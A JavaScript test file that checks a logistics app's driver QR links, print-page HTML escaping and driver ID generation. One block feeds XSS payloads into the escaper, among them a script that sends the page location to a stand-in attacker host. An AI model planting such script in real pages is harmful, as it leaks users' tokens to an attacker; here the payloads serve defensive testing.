import assert from "node:assert/strict";
import { conductorPublicUrl } from "../src/utils/conductorUrl.js";
import {
  buildDriverQrPrintHtml,
  driverInstallUrl,
  driverRouteUrl,
  escapeHtml,
  isDriverRouteUrl,
} from "../src/utils/logistica/driverQr.js";
import { driverIdFromPhone, ensureStopUuid } from "../server/lib/driverId.js";

console.log("conductorUrl + driverId");

assert.equal(
  conductorPublicUrl("https://calculadora-bmc.vercel.app", "tok"),
  "https://calculadora-bmc.vercel.app/conductor?t=tok",
);
assert.ok(!conductorPublicUrl("https://x.com", "a").includes("/calculadora/conductor"));

{
  const install = driverInstallUrl("https://calculadora-bmc.vercel.app");
  const route = driverRouteUrl("https://calculadora-bmc.vercel.app", "tok");
  assert.equal(install, "https://calculadora-bmc.vercel.app/conductor");
  assert.equal(route, conductorPublicUrl("https://calculadora-bmc.vercel.app", "tok"));
  assert.equal(isDriverRouteUrl(route), true);
  assert.equal(isDriverRouteUrl(install), false);
  console.log("  ✓ install QR payload /conductor; route QR is same as driver_url");
}

{
  assert.equal(escapeHtml(`<img src=x onerror="alert(1)">`), "&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
  const xssCaption = `</title><script>fetch("https://evil.example/?t="+location)</script>`;
  const html = buildDriverQrPrintHtml({
    caption: xssCaption,
    href: "https://calculadora-bmc.vercel.app/conductor?t=secret-token",
    src: "data:image/png;base64,aaa",
    size: 200,
  });
  assert.ok(html.includes("&lt;/title&gt;"));
  assert.ok(!html.includes("<script>"));
  assert.ok(html.includes("secret-token"));
  assert.equal(buildDriverQrPrintHtml({ caption: "x", href: "y", src: "https://evil/x.png" }), "");
  console.log("  ✓ print HTML escapes caption; rejects non-data image src");
}

{
  // Document the HTML windowFeatures contract that broke Imprimir QR in #1152:
  // noopener/noreferrer in features ⇒ window.open returns null (print never runs).
  const badFeatures = "noopener,noreferrer,width=420,height=560";
  const goodFeatures = "width=420,height=560";
  assert.ok(/\bnoopener\b/.test(badFeatures) || /\bnoreferrer\b/.test(badFeatures));
  assert.ok(!/\bnoopener\b/.test(goodFeatures) && !/\bnoreferrer\b/.test(goodFeatures));
  console.log("  ✓ print windowFeatures must omit noopener/noreferrer");
}

const a = driverIdFromPhone("+59899111222");
const b = driverIdFromPhone("59899111222");
assert.equal(a, b);
assert.match(a, /^[0-9a-f-]{36}$/);

const u = ensureStopUuid({ id: "s1" }, 0);
assert.match(u, /^[0-9a-f-]{36}$/);
assert.equal(ensureStopUuid({ id: "11111111-1111-4111-8111-111111111111" }, 0), "11111111-1111-4111-8111-111111111111");

console.log("conductorUrl + driverId OK");
